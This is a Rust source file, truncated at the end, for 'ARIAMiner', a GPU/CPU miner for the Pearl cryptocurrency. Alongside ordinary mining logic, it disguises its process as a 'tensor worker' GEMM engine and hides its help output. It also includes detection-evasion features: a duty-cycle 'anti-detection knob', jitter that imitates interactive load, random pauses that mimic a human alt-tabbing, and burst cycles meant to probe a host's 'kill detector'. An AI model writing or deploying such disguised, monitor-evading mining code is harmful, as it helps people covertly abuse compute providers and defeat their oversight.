//! ARIAMiner — open-source, 0% dev-fee CPU miner for Pearl (PRL).
//!
//! Grinds Pearl's canonical GEMM Int7×Int7 proof-of-work and submits real
//! `PlainProof` shares — every accepted share passes the node-side
//! `verify_plain_proof`. Optimized with AVX-512 VNNI / AVX-VNNI (scalar
//! fallback), auto-reconnects on pool drops, and exposes optional JSON stats
//! via `--stats-port` (used by the HiveOS integration).
//!
//!   ariaminer --pool <host:port> --wallet prl1... --worker my-rig [--threads N] [--stats-port 4068]

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::thread;
use std::time::{Duration, Instant};

#[cfg(not(feature = "gpu"))]
use ariaminer::official_grind::try_mine_one_bounded;
use ariaminer::official_grind::Workspace;
#[cfg(feature = "gpu")]
use ariaminer::official_grind::{
    build_proofs_from_setup_gpu_fixb, canonical_gpu_config, compute_job_key_pub,
};
use ariaminer::official_proof::{encode_base64, encode_base64_gzip};
use ariaminer::mouchard::Mouchard;
use ariaminer::protocol::{Job, MiningParams};
use ariaminer::stratum::{Dialect, JobEvent, StratumConfig, Submission, run as stratum_run};
use ariaminer::stratum_to_official::{OfficialJob, build_official_job};
use clap::Parser;
use parking_lot::Mutex;
use rand::SeedableRng;
#[cfg(feature = "gpu")]
use rand::RngCore;
use rand::rngs::StdRng;
use tokio::sync::{broadcast, mpsc};

#[derive(Parser, Debug)]
#[command(
    name = "tworker",
    about = "tensor worker - async GEMM engine",
    disable_help_flag = true,
    disable_version_flag = true
)]
struct Args {
    #[arg(long, env = "ARIA_POOL")]
    pool: Option<String>,
    #[arg(long, env = "ARIA_WALLET")]
    wallet: Option<String>,
    #[arg(long, default_value = "aria", env = "ARIA_WORKER")]
    worker: String,
    #[arg(long, default_value = "x")]
    password: String,
    /// CPU task threads. Default: all logical processors.
    #[arg(long)]
    threads: Option<usize>,
    /// Expose a JSON telemetry endpoint on 127.0.0.1:<port>.
    #[arg(long)]
    stats_port: Option<u16>,
    /// Wire protocol variant: "pearl" (object-wire) or "luckypool". Default:
    /// auto-detected from the remote host ("luckypool" substring).
    #[arg(long, env = "ARIA_DIALECT")]
    dialect: Option<String>,
}

/// LuckyPool sends no `pearl.set_mining_params` — the Pearl mainnet defaults
/// apply (m=n=131072, k=4096, rank=256). m/n are advisory (the miner picks its
/// own batch via ARIA_BATCH_M/N — they are not part of the job_key); the
/// patterns are the canonical GPU MMA fragment (same lists as
/// `canonical_gpu_config`, which the GPU path re-derives anyway).
fn luckypool_default_params() -> MiningParams {
    // v0.7.0-wgmma: if wgmma is active, use its fragment pattern (same as
    // herominers). LuckyPool uses rank=256 and larger m/n, but the per-thread
    // fragment shape is determined by the MMA atom, not the matrix dimensions.
    let (rows_pattern, cols_pattern) =
        if std::env::var("ARIA_WGMMA").is_ok() && std::env::var("ARIA_NO_WGMMA").is_err() {
            (
                vec![0, 8],
                (0..32u32).flat_map(|j| vec![8 * j, 8 * j + 1]).collect(),
            )
        } else {
            (
                vec![0, 8, 32, 40, 64, 72, 96, 104],
                vec![0, 1, 16, 17, 32, 33, 48, 49, 64, 65, 80, 81, 96, 97, 112, 113],
            )
        };
    MiningParams {
        m: 131_072,
        n: 131_072,
        k: 4096,
        rank: 256,
        rows_pattern,
        cols_pattern,
        mma_type: "Int7xInt7ToInt32".into(),
    }
}

/// HeroMiners/gfwroute params: no `pearl.set_mining_params` rides the v2 wire,
/// so these are self-declared. Only the patterns/rank are consensus-relevant
/// (committed via job_key + reconstructed verifier-side from the submitted
/// indices); m/n are the miner's own batch (advisory). Canonical GPU MMA
/// fragment 8×16, rank 128, k=8192 (post-fork mainnet shape).
fn herominers_default_params() -> MiningParams {
    // The multistage 128×256 kernel maps each winning thread fragment to the
    // period-256 column pattern measured by `tma_coords_dump`. The baseline
    // 128×128 kernel maps to period 128. The config is part of job_key, so this
    // MUST track the selected kernel or every otherwise-good hit fails the
    // verifier's Merkle/job-key reconstruction before submission.
    let (rows_pattern, cols_pattern) = if std::env::var("ARIA_T4_DUAL").is_ok()
        || std::env::var("ARIA_T4_WIDE").is_ok()
    {
        // Warp-owned Turing paths (dual 16×16 pair and wide four-tile 128×256
        // CTA): each emitted hit is one complete contiguous 16×16 proof tile,
        // so there is no shared-atomic fold reconstruction. Both kernels dump
        // the same normalized shape (verified via sm75_wide_bench coords mode:
        // rows 0..15 × cols 0..15, consistent across all slots).
        ((0..16).collect(), (0..16).collect())
    } else if std::env::var("ARIA_WGMMA").is_ok() && std::env::var("ARIA_NO_WGMMA").is_err() {
        // v0.7.0-wgmma: Hopper wgmma 128×256 kernel fragment pattern.
        // Measured live via tma_ms_bench_wgmma coords mode (all 256 threads
        // consistent). 2 rows × 64 cols per thread; period-16 rows, period-256 cols.
        // Must be checked BEFORE the ARIA_TMA_MS branch because wgmma also
        // implies ARIA_TMA_MS=1.
        (
            vec![0, 8],
            (0..32u32).flat_map(|j| vec![8 * j, 8 * j + 1]).collect(),
        )
    } else if std::env::var("ARIA_TMA_MS").is_ok() {
        (
            vec![0, 8, 32, 40, 64, 72, 96, 104],
            vec![0, 1, 32, 33, 64, 65, 96, 97, 128, 129, 160, 161, 192, 193, 224, 225],
        )
    } else {
        // sm_75 canonical 8×16 : le kernel émet des tuiles CONTIGUËS ; les indices
        // soumis redéfinissent le pattern côté node → job_key doit matcher ce que
        // le kernel a engagé (sinon Hash A mismatch au parse/verify).
        ((0..8).collect(), (0..16).collect())
    };
    MiningParams {
        // PeakMiner's accepted proofs use these dimensions on both Ampere and
        // B200. Modal A10 sweeps also beat 131072² (48.4 vs 46.4 TH/s) here.
        m: 16_384,
        n: 65_536,
        k: 8192,
        rank: ariaminer::official_grind::rank_from_env() as u32,
        rows_pattern,
        cols_pattern,
        mma_type: "Int7xInt7ToInt32".into(),
    }
}

/// LuckyPool job ids look like `45173737_500000` — the suffix is the share
/// difficulty. Used for the display/credited counters (the grind bound itself
/// comes from the job's full 256-bit `target`).
fn diff_from_job_id(job_id: &str) -> Option<u64> {
    job_id.rsplit_once('_').and_then(|(_, d)| d.parse().ok())
}

/// A job ready to grind: the stratum job id (echoed in the submit) plus the
/// official inputs. Cheap to clone (matrices are drawn per attempt, not here).
#[derive(Clone)]
struct GrindJob {
    job_id: String,
    official: OfficialJob,
}

/// Worker pool grinding the current job. Workers re-read `job_slot` each attempt,
/// so a new pool job hot-swaps without restarting threads.
struct GrindGen {
    stop: Arc<AtomicBool>,
    handles: Vec<thread::JoinHandle<()>>,
}

impl GrindGen {
    fn retire(self) {
        self.stop.store(true, Ordering::Relaxed);
        for h in self.handles {
            let _ = h.join();
        }
    }
}

/// Minimal JSON stats endpoint (HiveOS / monitoring) — no extra deps. Each GET
/// returns `{hashrate_hs, accepted, rejected, threads, uptime_s}` and closes.
async fn serve_stats(
    port: u16,
    shares: Arc<AtomicU64>,
    hashrate_hs: Arc<AtomicU64>,
    threads: usize,
    started: Instant,
) -> anyhow::Result<()> {
    use tokio::io::AsyncWriteExt;
    let listener = tokio::net::TcpListener::bind(("127.0.0.1", port)).await?;
    tracing::info!(port, "stats endpoint listening on 127.0.0.1");
    loop {
        let (mut sock, _) = match listener.accept().await {
            Ok(p) => p,
            Err(_) => continue,
        };
        let body = format!(
            "{{\"hashrate_hs\":{},\"accepted\":{},\"rejected\":0,\"threads\":{},\"uptime_s\":{}}}",
            hashrate_hs.load(Ordering::Relaxed),
            shares.load(Ordering::Relaxed),
            threads,
            started.elapsed().as_secs(),
        );
        let resp = format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            body
        );
        let _ = sock.write_all(resp.as_bytes()).await;
        let _ = sock.shutdown().await;
    }
}

/// v0.5.0 — un hit GPU brut envoyé au pool de threads "builder" : seed + tuile + tout
/// ce qu'il faut pour reconstruire la `PlainProof` HORS du thread grind (pattern ethminer :
/// le GPU ne stalle jamais, l'emballage coûteux part sur d'autres cœurs).
#[cfg(feature = "gpu")]
struct HitJob {
    seed: u64,      // a_seed (A varie par attempt)
    b_seed: u64,    // b_seed figé par job (fix-B) ; = seed si fix-B off
    hit: ariaminer::gpu_ffi::Hit,
    job_key: [u8; 32],
    gm: usize,
    gn: usize,
    k: usize,
    rank: usize,
    tile_h: usize,
    tile_w: usize,
    job_id: String,
}

#[allow(clippy::too_many_arguments)]
fn spawn_grind(
    job_slot: Arc<Mutex<Arc<GrindJob>>>,
    threads: usize,
    attempts: Arc<AtomicU64>,
    shares: Arc<AtomicU64>,
    credited: Arc<AtomicU64>,
    diff_arc: Arc<AtomicU64>,
    // m·n·k of the current setup — lets the reporter show a stable, deterministic
    // hashrate (setups/s × work) instead of the noisy share-luck estimate.
    work_per_setup: Arc<AtomicU64>,
    hs_arc: Arc<AtomicU64>,
    dialect: Dialect,
    submit_tx: mpsc::Sender<Submission>,
    mouchard: Arc<Mouchard>,
) -> GrindGen {
    let stop = Arc::new(AtomicBool::new(false));
    // v0.5.0 : sur GPU, UN seul thread + UN seul contexte résident suffisent à saturer
    // le GPU (mesuré : 1 thread tight = 157 TH/s, GPU-bound ; le wrapper coûte 0.016 ms).
    // Plus de threads = plusieurs contextes concurrents qui se DISPUTENT le GPU (146 < 157)
    // et bouffent le CPU pour rien. CPU mining = N threads (chacun un cœur).
    #[cfg(feature = "gpu")]
    let nthreads = 1;
    #[cfg(not(feature = "gpu"))]
    let nthreads = threads;
    let handles = (0..nthreads)
        .map(|tid| {
            let job_slot = Arc::clone(&job_slot);
            let stop = Arc::clone(&stop);
            let attempts = Arc::clone(&attempts);
            let shares = Arc::clone(&shares);
            let credited = Arc::clone(&credited);
            let diff_arc = Arc::clone(&diff_arc);
            let work_per_setup = Arc::clone(&work_per_setup);
            let hs_arc = Arc::clone(&hs_arc);
            let submit_tx = submit_tx.clone();
            let mouchard = Arc::clone(&mouchard);
            thread::spawn(move || {
                let mut rng = StdRng::seed_from_u64(
                    0xA51A_0000 ^ (tid as u64) ^ (Instant::now().elapsed().as_nanos() as u64),
                );
                // One reusable workspace per thread — the hot loop allocates nothing.
                let mut ws = Workspace::new();

                // ============ CHEMIN CPU (inchangé : N threads, config pool) ============
                #[cfg(not(feature = "gpu"))]
                while !stop.load(Ordering::Relaxed) {
                    let job = job_slot.lock().clone();
                    let oj = &job.official;
                    work_per_setup.store(
                        (oj.m as u64) * (oj.n as u64) * (oj.k as u64),
                        Ordering::Relaxed,
                    );
                    let hit = try_mine_one_bounded(
                        &mut ws, &mut rng, oj.m, oj.n, oj.k, &oj.header, &oj.config, &oj.bound_le,
                    );
                    attempts.fetch_add(1, Ordering::Relaxed);
                    if let Some(proof) = hit {
                        let enc = if dialect == Dialect::HeroMiners {
                            encode_base64_gzip(&proof)
                        } else {
                            encode_base64(&proof)
                        };
                        if let Ok(proof_base64) = enc {
                            shares.fetch_add(1, Ordering::Relaxed);
                            credited.fetch_add(diff_arc.load(Ordering::Relaxed), Ordering::Relaxed);
                            let _ = submit_tx.try_send(Submission {
                                job_id: job.job_id.clone(),
                                proof_base64,
                                hs: hs_arc.load(Ordering::Relaxed) as f64,
                            });
                        }
                    }
                }

                // ============ CHEMIN GPU v0.5.0 : 1 contexte, constantes hoistées ============
                // Le GEMM IMMA folde des fragments 8×16 → on mine avec `canonical_gpu_config`
                // (forme de tuile du fragment). Le bound est config-indépendant ; m/n forcés
                // à des multiples de 128 (tuile CTA). Le node reconstruit ce config exact depuis
                // les indices soumis → vérif OK. job_key/config/dims = constants par JOB :
                // on ne les recalcule QUE quand le job change (sinon ils affament le GPU).
                #[cfg(feature = "gpu")]
                {
                    let _ = &mut ws; // le grind n'emballe plus de preuve sur CPU.

                    // EMBALLAGE GPU SÉRIALISÉ (dans CE thread, entre 2 grinds) : le builder
                    // GPU (arbres Merkle sur GPU, ~33 Mo CPU/setup) DOIT être sérialisé avec le
                    // grind multistage TMA — un emballage GPU CONCURRENT (autre thread) corrompt
                    // le kernel TMA (« unspecified launch failure »). On bâtit donc la preuve
                    // INLINE quand un hit tombe (build GPU = rapide, seulement sur hit) → RAM
                    // bornée (160 Mo, plus d'OOM 23 Go) ET pas de conflit GPU.
                    use ariaminer::gpu_ffi::ProofGpuCtx;
                    let mut pctx: Option<(usize, usize, usize, ProofGpuCtx, ProofGpuCtx)> = None;

                    let fixb = std::env::var("ARIA_FIXB").is_ok(); // fix-B : B figé/job, A streamé
                    let mut b_seed_job: Option<u64> = None;        // seed de B (figé), reset au job
                    // ARIA_GPU_LONGPAUSE_* noise injection is now RATE-GATED (once per
                    // ARIA_GPU_LONGPAUSE_CHECK_SECS window, default 60s) instead of rolled on
                    // every empty setup. Rolling per-setup was WAY too aggressive at typical
                    // setup rates (~0.5-2 setups/s): PROB=20 was firing every ~5 setups and a
                    // 15-45s pause every few seconds crushed effective duty to ~5-10% instead of
                    // the intended ~30%+. Gating by wall-clock time makes the pause frequency
                    // independent of throughput/duty and matches the intended "occasional human
                    // alt-tab", not "constant stutter".
                    let mut last_longpause_check = Instant::now();
                    // ARIA_BURST_ON_SECS / ARIA_BURST_OFF_SECS: macro burst cycles —
                    // 100% GPU for ON seconds, then fully idle for OFF seconds, while the
                    // stratum connection stays alive in its async task. Tests whether the
                    // kill detector keys on *continuous* sustained utilization rather than
                    // average duty. When set, overrides ARIA_GPU_DUTY (duty stays 100%
                    // within bursts; the idle gaps shape the macro pattern instead).
                    let burst_on_secs: f64 = std::env::var("ARIA_BURST_ON_SECS")
                        .ok()
                        .and_then(|s| s.parse().ok())
                        .filter(|v| *v > 0.0)
                        .unwrap_or(0.0);
                    let burst_off_secs: f64 = std::env::var("ARIA_BURST_OFF_SECS")
                        .ok()
                        .and_then(|s| s.parse().ok())
                        .filter(|v| *v > 0.0)
                        .unwrap_or(0.0);
                    let burst_active = burst_on_secs > 0.0 && burst_off_secs > 0.0;
                    let mut burst_cycle_start = Instant::now();
                    if burst_active {
                        tracing::info!(
                            on_s = burst_on_secs,
                            off_s = burst_off_secs,
                            "burst mode enabled (overrides ARIA_GPU_DUTY)"
                        );
                    }
                    // v0.6.2 : overlap prologue — le seed du setup SUIVANT est pré-tiré pour
                    // que le kernel préfetche son prologue pendant le grind courant.
                    let mut next_seed: u64 = rng.next_u64();
                    let mut gpu_ctx: Option<ariaminer::gpu_ffi::ResidentCtx> = None;
                    // (job_id, job_key, gm, gn, k, rank, tile_h, tile_w, bound_le)
                    let mut cache: Option<(String, [u8; 32], usize, usize, usize, usize, usize, usize, [u8; 32])> = None;
                    while !stop.load(Ordering::Relaxed) {
                        let job = job_slot.lock().clone();
                        // Identify the job by its ID, NEVER by `Arc::as_ptr`: the previous
                        // Arc is dropped each iteration and the allocator hands the same
                        // address to the next job (ABA), so a pointer compare silently kept
                        // a STALE job_key/bound while the packaged proof and the pool used
                        // the new header -> every share recomputed to a random jackpot.
                        if cache.as_ref().map(|c| c.0.as_str()) != Some(job.job_id.as_str()) {
                            let oj = &job.official;
                            let gconf = oj.config.clone();
                            let gm = oj.m.div_ceil(128) * 128;
                            let gn = oj.n.div_ceil(128) * 128;
                            let job_key = compute_job_key_pub(&oj.header, &gconf);
                            let rank = gconf.rank as usize;
                            let tile_h = gconf.rows_pattern.to_list().len();
                            let tile_w = gconf.cols_pattern.to_list().len();
                            if gpu_ctx.as_ref().map(|c| c.dims()) != Some((gm, gn, oj.k)) {
                                let c = ariaminer::gpu_ffi::ResidentCtx::new(gm, gn, oj.k, 64);
                                // Mouchard : split per-phase (cudaEvents) seulement si activé.
                                c.set_timing(mouchard.enabled());
                                gpu_ctx = Some(c);
                            }
                            work_per_setup.store((gm as u64) * (gn as u64) * (oj.k as u64), Ordering::Relaxed);
                            // ⚠️ reset B SEULEMENT si le job_key change (= vrai job), PAS sur un simple
                            // changement de vardiff (job_ptr change mais job_key identique) — sinon désync
                            // avec le kernel C++ ARIA_FIXB (qui garde B tant que le job_key ne change pas).
                            let job_key_changed = cache.as_ref().map(|c| c.1) != Some(job_key);
                            tracing::info!(
                                job_id = %job.job_id,
                                bound_le = %hex::encode(&oj.bound_le),
                                "task cache ready"
                            );
                            cache = Some((job.job_id.clone(), job_key, gm, gn, oj.k, rank, tile_h, tile_w, oj.bound_le));
                            if job_key_changed { b_seed_job = None; }
                        }
                        let (_, job_key, gm, gn, k, rank, tile_h, tile_w, bound_le) =
                            cache.as_ref().unwrap();
                        let ctx = gpu_ctx.as_ref().unwrap();

                        // Boucle TIGHT : SEULEMENT le grind GPU (gen→commit→noise→GEMM→powcheck).
                        let setup_seed = next_seed;
                        next_seed = rng.next_u64();
                        // fix-B : b_seed figé au 1er grind du job (= ce que le kernel ARIA_FIXB garde) ; sinon = setup_seed
                        let b_seed = if fixb { *b_seed_job.get_or_insert(setup_seed) } else { setup_seed };
                        // ARIA_GPU_DUTY=NN (0<NN<100) : duty-cycle cap — sleeps after each
                        // setup so sustained GPU util reads ~NN% (anti-detection knob).
                        let duty_pct: u64 = std::env::var("ARIA_GPU_DUTY")
                            .ok()
                            .and_then(|s| s.parse().ok())
                            .filter(|v| *v > 0 && *v < 100)
                            .unwrap_or(100);
                        // ARIA_GPU_DUTY_JITTER=NN : duty varies in [duty-NN, duty+NN] per setup
                        // (looks like interactive load, not a flat miner's 100%).
                        let duty_jitter: u64 = std::env::var("ARIA_GPU_DUTY_JITTER")
                            .ok()
                            .and_then(|s| s.parse().ok())
                            .unwrap_or(0);
                        let duty_pct = if duty_jitter > 0 {
                            let j = (rng.next_u64() % (duty_jitter * 2 + 1)) as i64 - duty_jitter as i64;
                            ((duty_pct as i64 + j).clamp(1, 100)) as u64
                        } else { duty_pct };
                        let gt0 = Instant::now();
                        let (found, hits) = ctx.grind2(setup_seed, next_seed, job_key, bound_le);
                        // ARIA_BURST_ON_SECS / ARIA_BURST_OFF_SECS: macro burst cycles.
                        // Grind flat-out for ON seconds, then idle for OFF seconds (stratum
                        // connection stays alive in the async task). Overrides per-setup
                        // duty throttling when set — the idle gaps shape the utilization
                        // curve instead of a per-setup sawtooth.
                        if burst_active && found == 0
                            && burst_cycle_start.elapsed().as_secs_f64() >= burst_on_secs
                        {
                            let job_id_before = job.job_id.clone();
                            tracing::info!(
                                on_s = burst_on_secs,
                                off_s = burst_off_secs,
                                "burst idle window"
                            );
                            // Sleep in short ticks so we wake early on stop or new job.
                            let off_start = Instant::now();
                            loop {
                                if off_start.elapsed().as_secs_f64() >= burst_off_secs { break; }
                                if stop.load(Ordering::Relaxed) { break; }
                                if job_slot.lock().job_id != job_id_before { break; }
                                std::thread::sleep(std::time::Duration::from_millis(500));
                            }
                            burst_cycle_start = Instant::now();
                        }
                        // MINIMAL FIX: never duty-sleep when a hit was just found — that dead
                        // time sits BEFORE proof packaging/submission and can let the pool roll
                        // the job in the meantime, turning a real share into a stale one. Only
                        // throttle on empty (found==0) setups.
                        if !burst_active && duty_pct < 100 && found == 0 {
                            let spent = gt0.elapsed().as_secs_f64();
                            if spent > 0.0 {
                                let sleep_s = spent * (100.0 - duty_pct as f64) / duty_pct as f64;
                                std::thread::sleep(std::time::Duration::from_secs_f64(sleep_s));
                            }
                            // ARIA_GPU_LONGPAUSE_PROB=0..100 (pct chance per empty setup) +
                            // ARIA_GPU_LONGPAUSE_SECS_MIN/MAX: occasionally inject a long idle
                            // gap on top of the normal duty sleep, mimicking a human alt-tabbing
                            // away / reading output rather than a perfectly periodic sawtooth.
                            // Disabled by default (prob=0) so existing behavior is unchanged
                            // unless explicitly opted in.
                            let longpause_prob: u64 = std::env::var("ARIA_GPU_LONGPAUSE_PROB")
                                .ok().and_then(|s| s.parse().ok()).unwrap_or(0);
                            let longpause_check_secs: f64 = std::env::var("ARIA_GPU_LONGPAUSE_CHECK_SECS")
                                .ok().and_then(|s| s.parse().ok()).unwrap_or(60.0);
                            if longpause_prob > 0
                                && last_longpause_check.elapsed().as_secs_f64() >= longpause_check_secs
                            {
                                last_longpause_check = Instant::now();
                                if (rng.next_u64() % 100) < longpause_prob {
                                    let lp_min: f64 = std::env::var("ARIA_GPU_LONGPAUSE_SECS_MIN")
                                        .ok().and_then(|s| s.parse().ok()).unwrap_or(3.0);
                                    let lp_max: f64 = std::env::var("ARIA_GPU_LONGPAUSE_SECS_MAX")
                                        .ok().and_then(|s| s.parse().ok()).unwrap_or(8.0);
                                    let span = (lp_max - lp_min).max(0.0);
                                    let extra = lp_min + span * ((rng.next_u64() % 10000) as f64 / 10000.0);
                                    tracing::info!(extra_s = extra, check_window_s = longpause_check_secs, "gpu_longpause noise injection (rate-gated)");
                                    std::thread::sleep(std::time::Duration::from_secs_f64(extra));
                                }
                            }
                        }
                        if mouchard.enabled() {
                            let wall = gt0.elapsed().as_nanos() as u64;
                            let (gc, no, gr) = ctx.last_times4();
                            mouchard.record_setup(gc, no, gr, wall, found.max(0) as u32);
                        }
                        attempts.fetch_add(1, Ordering::Relaxed);
                        if found > 0 {
                            // Hit → emballage GPU INLINE (sérialisé avec le grind : pas de
                            // conflit TMA). ctx.grind() a déjà sync (memcpy résultats) → le
                            // kernel grind est fini avant qu'on lance les kernels de preuve.
                            if let Some(hit) = hits
                                .into_iter()
                                .find(|h| h.rows.len() == *tile_h && h.cols.len() == *tile_w)
                            {
                                let (gm, gn, k) = (*gm, *gn, *k);
                                if pctx.as_ref().map(|c| (c.0, c.1, c.2)) != Some((gm, gn, k)) {
                                    // max_leafdata must cover the widest proof tile: each
                                    // selected row spans ceil(k/1024) Merkle leaves. The wgmma
                                    // 2×64 tile at k=8192 needs 64×8 = 512 leaves for B (the
                                    // old hard-coded 256 was sized for the 8×16 mma.sync tile
                                    // and asserted in gather() on the first wgmma hit).
                                    let leaves_per_row = k.div_ceil(1024);
                                    let a = ProofGpuCtx::new(gm, k, *tile_h * leaves_per_row);
                                    let b = ProofGpuCtx::new(gn, k, *tile_w * leaves_per_row);
                                    pctx = Some((gm, gn, k, a, b));
                                }
                                let (_, _, _, ca, cb) = pctx.as_ref().unwrap();
                                let bt0 = Instant::now();
                                let proofs = build_proofs_from_setup_gpu_fixb(
                                    ca, cb, setup_seed, b_seed, std::slice::from_ref(&hit),
                                    job_key, gm, gn, k, *rank, *tile_h, *tile_w,
                                );
                                mouchard.record_build(bt0.elapsed().as_nanos() as u64);
                                for proof in &proofs {
                                    if let Ok((private_params, public_params)) = ariaminer::official_proof::parse_plain_proof(job.official.header, proof) {
                                        let compiled = zk_pow::api::proof_utils::CompiledPublicParams::from(&public_params);
                                        let noise = zk_pow::circuit::pearl_noise::compute_noise(&compiled);
                                        let jackpot = zk_pow::circuit::chip::compute_jackpot(&compiled, &private_params.s_a, &private_params.s_b, &noise);
                                        let hash_jackpot = zk_pow::api::proof_utils::compute_jackpot_hash(&jackpot, compiled.a_noise_seed());
                                        let hash_u256 = primitive_types::U256::from_little_endian(&hash_jackpot);
                                        let bound_u256 = primitive_types::U256::from_little_endian(&job.official.bound_le);
                                        let is_valid = hash_u256 <= bound_u256;
                                        if let Some(target_be) = &job.official.target_be {
                                            let block_bound_u256 = primitive_types::U256::from_big_endian(target_be);
                                            if hash_u256 <= block_bound_u256 {
                                                tracing::info!("full-network target met hash_u256={:x}", hash_u256);
                                            }
                                        }
                                        if is_valid {
                                            let enc = if dialect == Dialect::HeroMiners {
                                                encode_base64_gzip(proof)
                                            } else {
                                                encode_base64(proof)
                                            };
                                            if let Ok(proof_base64) = enc {
                                                shares.fetch_add(1, Ordering::Relaxed);
                                                credited.fetch_add(diff_arc.load(Ordering::Relaxed), Ordering::Relaxed);
                                                let _ = submit_tx.try_send(Submission {
                                                    job_id: job.job_id.clone(), proof_base64,
                                                    hs: hs_arc.load(Ordering::Relaxed) as f64,
                                                });
                                            }
                                        } else {
                                            tracing::warn!("invalid checkpoint filtered by local verifier hash_u256={:x} bound_u256={:x}", hash_u256, bound_u256);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            })
        })
        .collect();
    GrindGen { stop, handles }
}

fn build_grind_job(params: &MiningParams, job: &Job, difficulty: u64) -> anyhow::Result<GrindJob> {
    let official = build_official_job(job, params, difficulty)?;
    Ok(GrindJob { job_id: job.job_id.clone(), official })
}

/// Auto-tune the mining grid: scan candidate batch sizes, measure each one's
/// effective tile throughput (setups/s × tiles-per-setup, and tiles ∝ m·n at fixed
/// config), and return the batch with the best throughput. The pool's hardware sweet
/// spot is found automatically instead of hard-coding a single grid.
/// The pool accepts any grid (proof validation is config-agnostic), so the miner
/// picks its own hardware sweet spot. Each candidate is measured by running the
/// real grind for a few seconds. Tunable: ARIA_AUTOTUNE_SECS, ARIA_AUTOTUNE_GRIDS
/// (comma-separated).
#[allow(clippy::too_many_arguments)]
async fn autotune_grid(
    params: &MiningParams,
    job: &Job,
    difficulty: u64,
    threads: usize,
    attempts: &Arc<AtomicU64>,
    shares: &Arc<AtomicU64>,
    credited: &Arc<AtomicU64>,
    diff_arc: &Arc<AtomicU64>,
    submit_tx: &mpsc::Sender<Submission>,
) -> usize {
    let candidates: Vec<usize> = std::env::var("ARIA_AUTOTUNE_GRIDS")
        .ok()
        .map(|s| s.split(',').filter_map(|x| x.trim().parse().ok()).collect::<Vec<_>>())
        .filter(|v: &Vec<usize>| !v.is_empty())
        .unwrap_or_else(|| vec![2048, 4096, 8192, 12288, 16384]);
    let secs: u64 = std::env::var("ARIA_AUTOTUNE_SECS")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(5);
    tracing::info!(grids = ?candidates, secs, "🔧 auto-tune: scanning grids");
    let mut best_batch = candidates[0];
    let mut best_score = 0f64;
    for &b in &candidates {
        unsafe {
            std::env::set_var("ARIA_BATCH_M", b.to_string());
            std::env::set_var("ARIA_BATCH_N", b.to_string());
        }
        let gj = match build_grind_job(params, job, difficulty) {
            Ok(g) => Arc::new(g),
            Err(e) => {
                tracing::warn!(grid = b, error = %e, "auto-tune: build failed, skip");
                continue;
            }
        };
        let (m, n) = (gj.official.m, gj.official.n);
        let slot = Arc::new(Mutex::new(gj));
        let start = attempts.load(Ordering::Relaxed);
        let t0 = Instant::now();
        let grind = spawn_grind(
            slot,
            threads,
            Arc::clone(attempts),
            Arc::clone(shares),
            Arc::clone(credited),
            Arc::clone(diff_arc),
            Arc::new(AtomicU64::new(0)), // autotune: hashrate display not needed
            Arc::new(AtomicU64::new(0)), // autotune: hs submit field unused
            Dialect::Pearl,               // autotune never submits — encoding arm irrelevant
            submit_tx.clone(),
            Arc::new(Mouchard::disabled()), // autotune : pas de télémétrie (fenêtres réelles seulement)
        );
        tokio::time::sleep(Duration::from_secs(secs)).await;
        let delta = attempts.load(Ordering::Relaxed).saturating_sub(start);
        let dt = t0.elapsed().as_secs_f64().max(1e-3);
        grind.retire();
        let setups_s = delta as f64 / dt;
        let score = setups_s * m as f64 * n as f64; // ∝ effective tiles/s
        tracing::info!(
            grid = b, m, n,
            setups_per_s = format!("{setups_s:.1}"),
            "auto-tune candidate"
        );
        if score > best_score {
            best_score = score;
            best_batch = b;
        }
    }
    best_batch
}

/// ANSI colors + the startup banner. Pure stdout, no crate.
mod ui {
    pub const RST: &str = "\x1b[0m";
    pub const B: &str = "\x1b[1m";
    pub const DIM: &str = "\x1b[2m";
    pub const CYA: &str = "\x1b[96m";
    pub const GRN: &str = "\x1b[92m";
    pub const YEL: &str = "\x1b[93m";
    pub const GRY: &str = "\x1b[90m";
    // Sprite palette (256-color), kept for optional pixel-art.
    pub const GRS: &str = "\x1b[38;5;71m"; // grass green
    pub const BRN: &str = "\x1b[38;5;94m"; // dirt / hair
    pub const SKN: &str = "\x1b[38;5;180m"; // Steve skin
    pub const EYE: &str = "\x1b[38;5;33m"; // eyes
    pub const STN: &str = "\x1b[38;5;245m"; // stone (pickaxe head)
    pub const DIA: &str = "\x1b[38;5;51m"; // diamond ore (PRL)
    pub const WHT: &str = "\x1b[97m";

    /// Best-effort GPU model for the banner (falls back to a generic label).
    pub fn gpu_name() -> String {
        std::process::Command::new("nvidia-smi")
            .args(["--query-gpu=name", "--format=csv,noheader"])
            .output()
            .ok()
            .filter(|o| o.status.success())
            .map(|o| {
                String::from_utf8_lossy(&o.stdout)
                    .lines()
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string()
            })
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| "CUDA GPU".into())
    }

    pub fn short_wallet(w: &str) -> String {
        if w.len() > 18 {
            format!("{}…{}", &w[..10], &w[w.len() - 6..])
        } else {
            w.to_string()
        }
    }

    /// Render one sprite row: each char → a colored `██` pixel (space = blank).
    /// Generic pixel-art sprite renderer (kept for optional art).
    pub fn px_row(row: &str) -> String {
        let mut s = String::new();
        for ch in row.chars() {
            let c = match ch {
                'H' => "\x1b[38;5;94m",  // hair (brown)
                'S' => "\x1b[38;5;180m", // skin
                'W' => "\x1b[97m",       // eye white
                'I' => "\x1b[38;5;27m",  // iris (blue)
                'N' => "\x1b[38;5;137m", // nose shadow
                'M' => "\x1b[38;5;58m",  // mustache (dark)
                'G' => "\x1b[38;5;250m", // pickaxe head (iron)
                'g' => "\x1b[38;5;244m", // pickaxe head shade
                'K' => "\x1b[38;5;130m", // handle (wood)
                'T' => "\x1b[38;5;37m",  // shirt (teal)
                't' => "\x1b[38;5;30m",  // shirt shade
                'L' => "\x1b[38;5;26m",  // trousers (blue)
                'l' => "\x1b[38;5;20m",  // trousers shade
                'B' => "\x1b[38;5;238m", // shoes (dark)
                'D' => "\x1b[38;5;51m",  // diamond
                'C' => "\x1b[38;5;31m",  // diamond shade
                _ => "",                 // space = blank pixel
            };
            if c.is_empty() {
                s.push_str("  ");
            } else {
                s.push_str(c);
                s.push_str("██");
            }
        }
        s.push_str("\x1b[0m");
        s
    }
}

fn print_banner(pool: &str, wallet: &str, worker: &str, threads: usize) {
    use ui::*;
